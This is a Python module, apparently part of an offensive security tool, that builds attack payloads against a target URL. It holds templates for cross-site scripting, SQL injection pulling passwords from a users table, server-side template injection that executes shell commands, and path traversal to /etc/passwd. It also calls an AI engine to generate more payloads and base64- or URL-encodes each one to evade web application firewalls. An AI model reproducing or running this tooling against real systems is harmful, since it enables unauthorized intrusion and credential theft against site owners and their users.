import asyncio
import base64
import urllib.parse
import random
import logging
from typing import Dict, List, Optional
from backend.ai.cortex import CortexEngine, get_cortex_engine

logger = logging.getLogger("Xytherion.Arsenal.Tactician")

class TacticianModule:
    """
    TACTICIAN ARSENAL MODULE
    Extracted from SigmaAgent for distributed worker execution.
    Role: Generative weaponsmithing and WAF evasion.
    """
    def __init__(self, ai_engine: Optional[CortexEngine] = None):
        self.ai = ai_engine or get_cortex_engine()
        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
            "../../../etc/passwd",
            "' OR '1'='1"
        ]

    async def generate_vectors(self, target_url: str, attack_types: List[str] = None) -> List[str]:
        """Generates a suite of attack vectors for a specific target."""
        attack_types = attack_types or ["XSS", "SQLi", "SSTI", "Traversal"]
        vectors = []
        
        # 1. AI-Driven Generation (if Cortex enabled)
        if self.ai and self.ai.enabled:
            try:
                ai_vectors = await self.ai.generate_attack_payloads(
                    target_url=target_url,
                    attack_types=attack_types
                )
                if ai_vectors:
                    vectors.extend(ai_vectors)
                    logger.info(f"🧠 Generated {len(ai_vectors)} AI-driven vectors.")
            except Exception as e:
                logger.debug(f"AI Generation FAIL: {e}")
        
        # 2. Template-Driven Generation (Heuristics)
        context = {
            "context_var": f"THREAT_{random.randint(100, 999)}",
            "context_table": "admin_creds",
            "cmd": "id"
        }
        for template in self.payload_templates:
            vectors.append(template.format(**context))
            
        # 3. Automated Obfuscation Layer (Mutation)
        final_vectors = []
        for v in vectors:
            final_vectors.append(v)
            # Variants
            final_vectors.append(self.obfuscate(v, "base64"))
            final_vectors.append(self.obfuscate(v, "url"))
            
        return list(set(final_vectors)) # Deduplicate

    def obfuscate(self, payload: str, method: str) -> str:
        """Applies mutation to bypass specific filters."""
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "url":
            return urllib.parse.quote(payload)
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        return payload

    async def predict_next_step(self, module_id: str, last_vuln_type: str) -> str:
        """Predicts the next logical attack vector based on historical cluster success."""
        # This will hook into the GraphAI Global Brain if available
        return "tech_fuzzer"
